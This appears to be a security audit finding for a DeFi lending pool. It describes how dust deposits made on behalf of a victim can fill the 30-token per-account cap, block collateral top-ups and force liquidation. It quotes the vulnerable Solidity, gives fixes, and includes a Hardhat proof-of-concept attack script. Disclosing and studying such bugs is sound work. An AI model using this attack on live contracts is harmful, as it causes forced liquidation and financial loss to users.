### Title
Unprivileged attacker can fill a victim's per-account token list via dust `deposit()` griefing, blocking collateral top-ups and forcing liquidation - (File: contracts/Pool.sol)

### Summary
`Pool.addToDepositTokensOfAccount` enforces `MAX_TOKENS_PER_USER = 30` on the combined `depositTokensOfAccount + debtTokensOfAccount` set of an account. Because `DepositToken.deposit(amount_, onBehalfOf_)` is permissionless and mints to an arbitrary `onBehalfOf_`, anyone can push dust deposits of every active deposit token into a victim's set. Once the victim's list is full, any action that would add a *new* token type to the account — depositing a new collateral type, receiving a transfer of a new deposit token, or issuing a new debt token — reverts with `UserReachedMaxTokens`, permanently (until slots are freed) preventing the victim from adding collateral and from borrowing additional synths.

### Finding Description
In `Pool.sol`, `onlyIfAdditionWillNotReachMaxTokens` reverts when the account's combined list reaches 30:

```solidity
if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
    revert UserReachedMaxTokens();
}
``` [1](#0-0) 

`addToDepositTokensOfAccount` is callable by any registered `DepositToken`: [2](#0-1) 

`DepositToken.deposit` accepts an arbitrary `onBehalfOf_` and `_mint` calls `pool.addToDepositTokensOfAccount(account_)` whenever the recipient's balance goes from 0 to >0: [3](#0-2) [4](#0-3) 

The same add-on-first-balance logic fires in `_transfer` for the recipient: [5](#0-4) 

And `DebtToken._mint` adds to `debtTokensOfAccount`, which counts toward the same 30 cap: [6](#0-5) 

Removal only happens when a balance returns to zero (`_burn` / `_transfer` sender-side). Crucially, the victim can only remove a dust entry by transferring or withdrawing it, which is gated by `_revertIfLocked` → `unlockedBalanceOf`, which returns 0 when `debtPositionOf` reports no issuable headroom — i.e. exactly when the victim needs to add collateral most: [7](#0-6) [8](#0-7) 

Attack path (all unprivileged, public entry points):
1. Victim opens a position (deposit + issue) using a few token types.
2. Attacker calls `depositToken_i.deposit(dust_i, victim)` for every active `DepositToken` in the pool until `depositTokensOfAccount.length(victim) + debtTokensOfAccount.length(victim) == 30`. Each call is pure cost to the attacker; the victim holds the minted dust.
3. Victim's collateral price drops → position becomes unhealthy. Victim attempts `newDepositToken.deposit(x, victim)` → `_mint` → `addToDepositTokensOfAccount` → `UserReachedMaxTokens` revert. Same for `issue` of any new synth (`addToDebtTokensOfAccount`) and for any transfer of a new deposit token type to the victim.
4. Because the position is at/below its collateral factor, `unlockedBalanceOf(victim) == 0` for every deposit token, so the victim cannot transfer out the dust to free slots. The only escape is acquiring synths on the market and calling `repay`/`repayAll` — which may be impossible or economically irrational before liquidators act.
5. Liquidator calls `Pool.liquidate` and seizes the victim's collateral at the incentive discount.

### Impact Explanation
Direct availability impact matching the DoS bug class: an unprivileged attacker can, at pure gas + dust cost, prevent a victim from (a) depositing any new collateral type, (b) receiving any new deposit token via transfer, and (c) issuing any new debt token — for as long as the victim's balance is locked (i.e., precisely while rescue is needed). This converts a recoverable unhealthy position into a forced liquidation, causing loss of the liquidation incentive and protocol fee on seized collateral. Even for solvent victims it temporarily blocks issuance and inbound transfers until they burn dust positions.

### Likelihood Explanation
No privileged role, oracle manipulation, or timing assumption is required: `deposit` is permissionless and `onBehalfOf_` is attacker-chosen. Cost is `(#active deposit tokens − victim's used slots)` dust deposits; no minimum deposit amount exists (`deposit` only reverts on `amount_ == 0`). The attack is most effective against leveraged/near-limit positions, which are also the ones where a failed top-up directly produces a loss.

### Recommendation
- Do not count tokens toward `MAX_TOKENS_PER_USER` when the credited amount is below a dust threshold, or only add to the per-account list on `deposit` amounts above a minimum.
- Alternatively, exempt removals: allow any account to call `removeFromDepositTokensOfAccount`-equivalent cleanup (e.g., a `claim`-less "forget token" path that sweeps the dust balance to the caller or treasury), so locked victims can free slots without needing unlocked balance.
- Consider tracking lists per token category separately, or dropping the per-account enumeration in favor of iterating the global `depositTokens`/`debtTokens` sets with balance checks.

### Proof of Concept
```ts
// Hardhat (ethers) — assumes deployed pool with >= N active DepositTokens
// victim: has deposited collateral and issued debt (debtPositionOf: issuableInUsd == 0)

const MAX = await pool.MAX_TOKENS_PER_USER(); // 30
const used = (await pool.getDepositTokensOfAccount(victim.address)).length
           + (await pool.getDebtTokensOfAccount(victim.address)).length;

// 1) Attacker fills victim's slots with dust deposits on behalf of the victim
for (let i = 0; i < MAX.toNumber() - used; i++) {
  const dt = depositTokens[i]; // distinct active DepositToken
  await underlying_i.connect(attacker).approve(dt.address, 1);
  await dt.connect(attacker).deposit(1, victim.address); // dust, onBehalfOf = victim
}
expect((await pool.getDepositTokensOfAccount(victim.address)).length
     + (await pool.getDebtTokensOfAccount(victim.address)).length).to.eq(MAX);

// 2) Price moves against the victim -> position unhealthy
await masterOracle.updatePrice(collateral.address, lowerPrice);
expect((await pool.debtPositionOf(victim.address))._isHealthy).to.be.false;

// 3) Victim cannot top up a NEW collateral type: reverts UserReachedMaxTokens
await newUnderlying.connect(victim).approve(newDepositToken.address, amount);
await expect(
  newDepositToken.connect(victim).deposit(amount, victim.address)
).to.be.revertedWithCustomError(pool, 'UserReachedMaxTokens');

// 3b) Victim cannot issue a new synth type either
await expect(
  newDebtToken.connect(victim).issue(1, victim.address)
).to.be.revertedWithCustomError(pool, 'UserReachedMaxTokens');

// 3c) Victim cannot free slots: all deposit balances are locked
expect(await depositToken.unlockedBalanceOf(victim.address)).to.eq(0);
await expect(
  depositToken.connect(victim).transfer(attacker.address, 1)
).to.be.revertedWithCustomError(depositToken, 'NotEnoughFreeBalance');

// 4) Attacker liquidates the unrescuable position
await pool.connect(attacker).liquidate(synth.address, victim.address, repayAmt, victimDepositToken.address);
```

### Citations

**File:** contracts/Pool.sol (L143-148)
```text
    modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
        if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
            revert UserReachedMaxTokens();
        }
        _;
    }
```

**File:** contracts/Pool.sol (L216-220)
```text
    function addToDepositTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _depositToken = _msgSender();
        _revertIfSenderIsNotDepositToken(_depositToken);
        if (!depositTokensOfAccount.add(account_, _depositToken)) revert DepositTokenAlreadyExists();
    }
```

**File:** contracts/DepositToken.sol (L211-237)
```text
    function deposit(
        uint256 amount_,
        address onBehalfOf_
    ) external override whenNotPaused nonReentrant onlyIfDepositTokenExists returns (uint256 _deposited, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();
        if (onBehalfOf_ == address(0)) revert BeneficiaryIsNull();

        IPool _pool = pool;
        IERC20 _underlying = underlying;
        address _msgSender = _msgSender();
        address _treasury = address(_pool.treasury());

        if (_msgSender == _treasury) revert TreasuryCanNotDeposit();

        uint256 _balanceBefore = _underlying.balanceOf(_treasury);
        _underlying.safeTransferFrom(_msgSender, _treasury, amount_);
        amount_ = _underlying.balanceOf(_treasury) - _balanceBefore;

        (_deposited, _fee) = quoteDepositOut(amount_);
        if (_fee > 0) {
            _mint(_pool.feeCollector(), _fee);
        }

        _mint(onBehalfOf_, _deposited);

        emit CollateralDeposited(_msgSender, onBehalfOf_, amount_, _deposited, _fee);
    }
```

**File:** contracts/DepositToken.sol (L348-354)
```text
    function transfer(address to_, uint256 amount_) external override returns (bool) {
        address _msgSender = _msgSender();
        _revertIfLocked(_msgSender, amount_);

        _transfer(_msgSender, to_, amount_);
        return true;
    }
```

**File:** contracts/DepositToken.sol (L383-398)
```text
    function unlockedBalanceOf(address account_) public view override returns (uint256 _unlockedBalance) {
        IPool _pool = pool;

        (, , uint256 _debtInUsd, , uint256 _issuableInUsd) = _pool.debtPositionOf(account_);

        if (_debtInUsd == 0) {
            return balanceOf[account_];
        }

        if (_issuableInUsd > 0) {
            _unlockedBalance = Math.min(
                balanceOf[account_],
                _pool.masterOracle().quoteUsdToToken(address(underlying), _issuableInUsd.wadDiv(collateralFactor))
            );
        }
    }
```

**File:** contracts/DepositToken.sol (L485-489)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(account_);
        }
    }
```

**File:** contracts/DepositToken.sol (L517-525)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_recipientBalanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(recipient_);
        }

        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (amount_ > 0 && balanceOf[sender_] == 0) {
            pool.removeFromDepositTokensOfAccount(sender_);
        }
```

**File:** contracts/DebtToken.sol (L597-601)
```text
        //  Add this token to the debt tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDebtTokensOfAccount(account_);
        }
    }
```
